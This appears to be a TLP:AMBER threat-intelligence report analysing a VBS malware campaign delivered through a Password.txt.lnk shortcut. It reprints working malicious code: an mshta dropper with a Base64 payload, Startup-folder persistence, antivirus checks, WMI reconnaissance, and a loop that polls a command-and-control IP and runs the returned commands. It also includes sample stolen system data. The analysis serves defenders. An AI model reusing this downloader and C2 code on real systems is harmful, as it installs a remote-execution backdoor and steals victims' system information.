@@ -1,0 +1,229 @@
+MALWARE ANALYSIS
+LNK Shortcut File - Password.txt.lnk
+Initial LNK file is a simple shortcut that downloads & executes VBS code from a remote server using Microsoft’s
+system utility MSHTA. It is observed that attackers use the URL shortening service “bit.ly” at every stage of the
+operation.
+TLP : AMBER
+File Dropping and Persistency - First Stage Downloader
+It can be seen that malware is dropping files in the below code snippet. The malware contains a Base64
+encoded code which then gets decoded and dropped under %Temp% directory with .vbs extension. After that,
+it creates another shortcut file under the Startup directory as a means of persistence.
+```
+    ucr="https://bit.ly/37W6fgx"
+…
+
+ln="b24gZXJyb3IgcmVzdW1lIG5leHQNCnJhbmRvbWl6ZQ0KaWYgV1NjcmlwdC5Bcmd1b
+WVudHMuTGVuZ3RoPjAgdGhlbg0KCUhUUD0iaHQiDQoJdXU9SFRQJiJ0cDoiJiIvLyImV1
+NjcmlwdC5Bcmd1bWVudHMuSXRlbSgwKQ0KCWNvYj0iV2luSHR0cCI"&"NCgljb2I9Y29i
+JiJSZXF1ZXN0LiINCgljb2I9Ildpbkh0dHAiJiIuIiZjb2INCgljb2I9Y29iJiI1LjEiD
+QoJc2V0IHdocj1DcmVhdGVPYmplY3QoY29iKQ0KCWRvIHdoaWxlIHRydWUNCgkJcHM9Il
+BPIg0KCQl0dz0iMiINCgkJcnRjPSIiDQoJCXRwYz11dSYiPyImInRvcCImImljPSImInM
+iJk"&"ludCgxMDAwKnJuZCs5MDAwKQ0KCQl3aHIuT3BlbiBwcyYiU1QiLHRwYyxmYWxzZ
+Q0KCQl3aHIuU2VuZCB0dyYiMDAiDQoJ"&"CWlmIHdoci5TdGF0dXM9MjAwIFRoZW4NCgk
+JCXJ0Yz13aHIuUmVzcG9uc2VUZXh0DQoJCWVuZCBpZg0KCQlpZiBydGM8PiIiIHRoZW4N
+CgkJCUV4ZWN1dGUocnRjKQ0KCQkJZXhpdCBkbw0KCQllbmQgaWYNCgkJV1NjcmlwdC5Tb
+GVlcCAxODAqMTAwMA0KCWxvb3ANCmVuZCBpZg0K"
+
+set fob=CreateObject("Scripting.FileSystemObject")
+flp=fob.GetSpecialFolder(2)&"\"&"Xbox"&".l"&"nk"
+
+Set tcl=wish.CreateShortcut(flp)
+tcl.TargetPath="msh"&"ta"
+
+pf=fob.GetSpecialFolder(2)&"\mfesf.vbs"
+set btf=fob.OpenTextFile(pf,2,true)
+
+tcl.Arguments=ucr
+
+…
+
+btf.Write dbsc(ln)
+btf.Close()
+
+```
+TLP : AMBER
+Base64 Decoded VBS Code - First Stage Downloader
+This code snippet sends POST requests to CnC at regular intervals to receive commands to be executed.
+```
+       on error resume next
+   randomize
+
+   if WScript.Arguments.Length>0 then
+       HTP="ht"
+
+       uu=HTP&"tp:"&"//"&WScript.Arguments.Item(0)
+       cob="WinHttp"
+       cob=cob&"Request."
+       cob="WinHttp"&"."&cob
+       cob=cob&"5.1"
+
+       set whr=CreateObject(cob)
+       do while true
+
+          ps="PO"
+          tw="2"
+
+          rtc=""
+
+          tpc=uu&"?"&"top"&"ic="&"s"&Int(1000*rnd+9000)
+          whr.Open ps&"ST",tpc,false
+          whr.Send tw&"00"
+
+          if whr.Status=200 Then
+
+              rtc=whr.ResponseText
+          end if
+
+          if rtc<>"" then
+
+              Execute(rtc)
+              exit do
+
+          end if
+
+          WScript.Sleep 180*1000
+       loop
+   end if
+
+```
+TLP : AMBER
+Checking for Security Products - First Stage Downloader
+Malware enumerates the list of processes by interacting with WMI. After that, it checks for the presence of
+several Antivirus products. In case Qihoo360 Total Security, a Chinese AV product, is present then it deletes the
+shortcut under Startup which it created a while back. Therefore malware does not persist on the system if this
+security product is present.
+```
+    set wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\.
+    \root\cimv2")
+    set pl=wmi.ExecQuery("Select * from "&"Win32_Process")
+for each pi in pl
+   tpl=tpl&LCase(pi.Name)&"|"
+
+next
+
+ex="ws"
+
+if Instr(tpl,"kwsp"&"rot")>0 or Instr(tpl,"nppr"&"ot")>0 then
+   ex="cs"
+
+end if
+
+ln="star"&"t /b " & ex & "cr"&"ipt """&pf&""" "+"203.144.133.42:8080/
+edit"
+
+ln2=" & move """&flp&""" """& wish.SpecialFolders("startup") &"\"""
+
+if Instr(tpl,"hudo"&"ngf")>0 or Instr(tpl,"qhs"&"afe")>0 then
+   ln2=" & del """&flp&""""
+else
+
+   tcl.Save
+
+end if
+
+wish.run "CM"&"D.E"&"XE "&"/c " & ln&" 1" & " & " & ln&" 2" &
+
+ln2,0,false
+
+```
+TLP : AMBER
+Information Gathering Through WMI – Second Stage Malware
+The malware gathers plenty of information about the local system through WMI. It is observed that this
+information is later sent to the CnC server by the malware.
+```
+       set adapItems=ObjWMI.ExecQuery("SELECT * FROM
+Win32_NetworkAdapterConfiguration",,48)
+
+   for each adapter in adapItems
+
+       on error resume next
+
+       if isNull(adapter.IPAddress) then
+       else
+
+          getInfo=getInfo+"Network
+Adapter:"+tab&adapter.Description+ent
+          getInfo=getInfo+" MAC
+Address:"+tab&adapter.MACAddress + ent
+          getInfo=getInfo+" IP
+Address:"+tab+Join(adapter.IPAddress, ",") + ent
+          getInfo=getInfo+" Subnet
+Mask:"+tab+Join(adapter.IPSubnet, ",") + ent
+          getInfo=getInfo+" Default
+Gateway:"+tab+Join(adapter.DefaultIPGateway, ",")+ ent
+          if adapter.DHCPEnabled=true then
+              getInfo=getInfo+" DHCP
+Servers:"+tab&adapter.DHCPServer + ent
+          end if
+
+          getInfo=getInfo+" DNS
+Server:"+tab+Join(adapter.DNSServerSearchOrder, ",") + ent
+       end if
+
+   next
+
+```
+TLP : AMBER
+Data sent to CnC
+```
+    Current Time: 12/3/2019 6:51:57 AM
+Username: USER-PC\admin
+
+Hostname: USER-PC
+
+OS Name: Microsoft Windows 7 Professional 32-bit
+
+OS Version: 6.1.7601
+
+Install Date: 10/05/2017
+
+Boot Time: 12/3/2019 5:48:54 AM
+
+Time Zone: (UTC 0 hours) GMT Standard Time
+CPU:  Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz (x64)
+Path:   C:\Users\admin\AppData\Local\Temp\mfesf.vbs
+
+Network Adapter: Intel(R) PRO/1000 MT Network Connection
+MAC Address: 52:54:00:4A:04:AF
+
+IP Address: 192.168.100.207,fe80::a179:b3ff:199:2314
+Subnet Mask: 255.255.255.0,64
+
+Default Gateway: 192.168.100.2
+DNS Server: 192.168.100.2
+
+3696 1 "C:\Windows\System32\cmd.exe" /C "ECHO huobi>C:
+\Users\admin\AppData\Local\Temp\Password.txt&NOTEPAD.EXE C:
+\Users\admin\AppData\Local\Temp\Password.txt&DEL C:
+\Users\admin\AppData\Local\Temp\Password.txt"
+2884 1 \??\C:\Windows\system32\conhost.exe
+328 1 NOTEPAD.EXE C:
+
+\Users\admin\AppData\Local\Temp\Password.txt
+2712 0 WmiPrvSE.exe
+
+1768 1 wscript "C:\Users\admin\AppData\Local\Temp\mfesf.vbs"
+203.144.133.42:8080/edit 1
+
+1096 1 wscript "C:\Users\admin\AppData\Local\Temp\mfesf.vbs"
+203.144.133.42:8080/edit 2
+
+```
+TLP : AMBER
+Command and Control Communication – Second Stage Malware
+It is observed that malware has two different communication methods to receive commands. The first method is
+simply receiving commands in Base64 encoded format. CNC responses beginning with “23#” are using this
+method.
+The second one is a bit more complicated. This time malware will receive a second URL from the CNC. Then it
+will send a GET request to this URL. The second server will respond with an encrypted payload and decryption
+key. We believe that this mechanism is meant to be a more resilient commanding system. CNC responses
+beginning with “20#” are using this method.
+
+
+Simple Communication Method
+
+
+Dead-Drop Communication Method
+
+
+TLP : AMBER
